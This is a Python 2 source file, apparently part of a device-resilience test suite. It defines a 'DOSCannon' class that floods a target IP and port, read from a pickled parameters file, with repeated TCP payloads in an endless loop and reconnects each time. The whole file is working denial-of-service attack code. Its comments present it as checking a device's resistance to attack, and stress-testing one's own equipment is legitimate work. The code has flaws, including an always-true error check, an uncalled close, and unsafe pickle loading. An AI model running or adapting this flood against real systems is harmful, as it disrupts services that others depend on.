# This is the main DOS group code
# First it will generate DOS (Denial of service) attack on the device while checking if
# the device reponds correctly
import socket
import random
import sys
import pickle


class DOSCannon(object):
    target = ('', '')

    def __init__(self,_ip, _port):
        self.Data = "abcdefghijklmnop"
        self.size = 128
        self.IP = _ip
        self.Port = _port
        pass

    def attack(self):
        Sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Sock.connect(self.target)
        while True:
            Bytes=(self.Data*self.size)
            BytesEnc=str.encode(Bytes)
            Sock.sendall(BytesEnc)
            print('Flooding {0} in port {1} with {2} bytes of data'.format(self.IP, self.Port, sys.getsizeof(BytesEnc)))
            if socket.error:
                    Sock.shutdown(socket.SHUT_RDWR)
                    Sock.close
                    del Sock
                    Sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    Sock.connect(self.target)
                    Bytes=(self.Data*self.size)
                    BytesEnc=str.encode(Bytes)
                    Sock.sendall(BytesEnc)

    def set_target(self, _target_ip,_target_port):
        self.target = (_target_ip, _target_port)

    def attack_type(self):
        pass

    def get_packet_size(self):
        pass


def collect_param():
    param_file = open('../parameters', 'rb')   # for debug purposes
    # param_file = open('Groups//parameters', 'rb')
    param_list = pickle.load(param_file)
    param_file.close()
    return param_list


def parse_param(param_list):
    parsed_param = {}
    for item in param_list:
        parsed_param[item[0]] = item[1]
    return parsed_param

if __name__ == "__main__":
    print "This is the DOS group, first we check the device resistance to simple one machine tcp attack"
    parameters = collect_param()
    parsed_parameters = parse_param(parameters)
    print "Parsed Successfully"
    cannon = DOSCannon(_ip=parsed_parameters['_IP'],_port=parsed_parameters['_Port'])
    cannon.set_target(parsed_parameters['_IP'],int(parsed_parameters['_Port']))
    cannon2 = DOSCannon(_ip=parsed_parameters['_IP'],_port=parsed_parameters['_Port'])
    cannon.attack()
    raw_input(cannon.target)
